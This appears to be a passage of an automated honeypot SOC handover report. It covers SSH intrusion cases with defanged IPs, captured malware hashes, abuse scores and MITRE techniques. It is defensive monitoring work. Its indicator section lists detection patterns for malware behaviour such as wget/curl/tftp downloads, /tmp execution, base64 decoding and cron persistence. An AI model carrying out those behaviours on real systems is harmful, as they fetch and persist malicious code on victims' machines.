| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:44:11` | `cowrie.session.connect` |
| `2026-08-29 22:44:11` | `cowrie.client.version` |
| `2026-08-29 22:44:11` | `cowrie.client.kex` |
| `2026-08-29 22:44:12` | `cowrie.login.success` |
| `2026-08-29 22:44:12` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:44:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:44:13` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf38f3d36e10

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:50 |
| **Last Seen** | 2026-08-29 22:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:50:53` | `cowrie.session.connect` |
| `2026-08-29 22:50:53` | `cowrie.client.version` |
| `2026-08-29 22:50:53` | `cowrie.client.kex` |
| `2026-08-29 22:50:54` | `cowrie.login.success` |
| `2026-08-29 22:50:54` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:50:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:50:54` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a7e3054ac3

| Field | Detail |
|---|---|
| **Source IP** | `122.170.96[.]105` |
| **First Seen** | 2026-08-29 22:51 |
| **Last Seen** | 2026-08-29 22:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:51:45` | `cowrie.session.connect` |
| `2026-08-29 22:51:46` | `cowrie.client.version` |
| `2026-08-29 22:51:46` | `cowrie.client.kex` |
| `2026-08-29 22:51:47` | `cowrie.login.success` |
| `2026-08-29 22:51:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.96[.]105` to AbuseIPDB if not already reported
- [ ] Block `122.170.96[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a3ffbffba5

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 22:54 |
| **Last Seen** | 2026-08-29 22:55 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:54:32` | `cowrie.session.connect` |
| `2026-08-29 22:54:32` | `cowrie.client.version` |
| `2026-08-29 22:54:32` | `cowrie.client.kex` |
| `2026-08-29 22:54:32` | `cowrie.login.success` |
| `2026-08-29 22:54:33` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:54:33` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 22:54:33` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `64.89.162[.]15` | **12** | 2026-08-29 19:08 | 2026-08-29 21:26 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **10** | 2026-08-29 19:05 | 2026-08-29 22:49 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `199.45.155[.]53` | **4** | 2026-08-29 20:33 | 2026-08-29 20:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `146.120.174[.]185` | **3** | 2026-08-29 20:39 | 2026-08-29 20:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]220` | **3** | 2026-08-29 20:38 | 2026-08-29 20:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]107` | **3** | 2026-08-29 21:08 | 2026-08-29 21:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]108` | **3** | 2026-08-29 21:54 | 2026-08-29 21:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]196` | **3** | 2026-08-29 21:53 | 2026-08-29 21:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]169` | **3** | 2026-08-29 21:08 | 2026-08-29 21:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]118` | **3** | 2026-08-29 21:09 | 2026-08-29 21:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]93` | **3** | 2026-08-29 21:54 | 2026-08-29 21:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `162.12.198[.]108` | **2** | 2026-08-29 20:23 | 2026-08-29 20:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.40.253[.]27` | **2** | 2026-08-29 20:07 | 2026-08-29 20:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `27.0.135[.]12` | **2** | 2026-08-29 20:13 | 2026-08-29 20:15 | 2m | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | **2** | 2026-08-29 20:38 | 2026-08-29 21:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.77.221[.]44` | **2** | 2026-08-29 20:55 | 2026-08-29 20:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.237.33[.]155` | **2** | 2026-08-29 21:24 | 2026-08-29 21:28 | 2m | 0 | `T1592` | 🟢 LOW |
| `88.70.0[.]121` | **2** | 2026-08-29 21:57 | 2026-08-29 21:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.114[.]235` | 1 | 2026-08-29 19:36 | 2026-08-29 19:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.58.173[.]254` | 1 | 2026-08-29 21:55 | 2026-08-29 21:57 | 93s | 0 | `T1592` | 🟢 LOW |
| `107.155.48[.]46` | 1 | 2026-08-29 20:57 | 2026-08-29 20:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `108.234.110[.]202` | 1 | 2026-08-29 20:30 | 2026-08-29 20:30 | 3s | 0 | `T1592` | 🟢 LOW |
| `115.246.242[.]2` | 1 | 2026-08-29 19:59 | 2026-08-29 19:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.255.159[.]152` | 1 | 2026-08-29 21:51 | 2026-08-29 21:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.130.168[.]66` | 1 | 2026-08-29 20:31 | 2026-08-29 20:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.41.76[.]54` | 1 | 2026-08-29 21:00 | 2026-08-29 21:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `153.239.192[.]5` | 1 | 2026-08-29 19:05 | 2026-08-29 19:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `156.238.86[.]2` | 1 | 2026-08-29 22:03 | 2026-08-29 22:03 | 1s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-08-29 19:43 | 2026-08-29 19:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.197[.]168` | 1 | 2026-08-29 19:40 | 2026-08-29 19:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-08-29 22:05 | 2026-08-29 22:06 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.100.217[.]164` | 1 | 2026-08-29 21:51 | 2026-08-29 21:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]102` | 1 | 2026-08-29 19:48 | 2026-08-29 19:48 | 2s | 0 | `T1592` | 🟢 LOW |
| `188.170.250[.]78` | 1 | 2026-08-29 19:48 | 2026-08-29 19:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `189.237.228[.]193` | 1 | 2026-08-29 19:56 | 2026-08-29 19:56 | 11s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-08-29 19:22 | 2026-08-29 19:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.226.76[.]34` | 1 | 2026-08-29 21:47 | 2026-08-29 21:47 | 5s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]64` | 1 | 2026-08-29 20:46 | 2026-08-29 20:46 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.115.102[.]16` | 1 | 2026-08-29 20:37 | 2026-08-29 20:37 | 10s | 0 | `T1592` | 🟢 LOW |
| `223.85.251[.]55` | 1 | 2026-08-29 22:20 | 2026-08-29 22:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.192.83[.]10` | 1 | 2026-08-29 22:20 | 2026-08-29 22:20 | 15s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-08-29 22:06 | 2026-08-29 22:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.59.109[.]240` | 1 | 2026-08-29 21:01 | 2026-08-29 21:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.77.70[.]142` | 1 | 2026-08-29 19:59 | 2026-08-29 19:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]117` | 1 | 2026-08-29 22:51 | 2026-08-29 22:51 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-29 20:36 | 2026-08-29 20:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.90.244[.]242` | 1 | 2026-08-29 19:09 | 2026-08-29 19:10 | 14s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-29 20:06 | 2026-08-29 20:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.255.208[.]30` | 1 | 2026-08-29 22:10 | 2026-08-29 22:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-08-29 22:34 | 2026-08-29 22:36 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.25.140[.]211` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `64.53.7[.]231` | US | Home Telephone Company, Inc. | **100** ⚠️ | 50 |
| `90.230.168[.]26` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `20.40.253[.]27` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `192.248.150[.]180` | GB | The Constant Company, LLC. | **100** ⚠️ | 50 |
| `115.246.242[.]2` | IN | Reliance Jio Infocomm Limited | **100** ⚠️ | 3 |
| `176.170.1[.]244` | FR | Bouygues Telecom Division Mobile | **100** ⚠️ | 33 |
| `117.248.201[.]39` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 8 |
| `202.154.15[.]177` | ID | PT Milenial Inti Telekomunikasi | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 206 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 175 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 1 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 13 |
| AbuseIPDB score 19 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 310 cases |
| Tool 34  | Credential Extractor        | ✅ 232 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 163 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (12.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 103 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 174 priority case(s) shown individually · 50 recon entry/entries in table (18 group(s) consolidating 64 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-29T23:59:18Z_
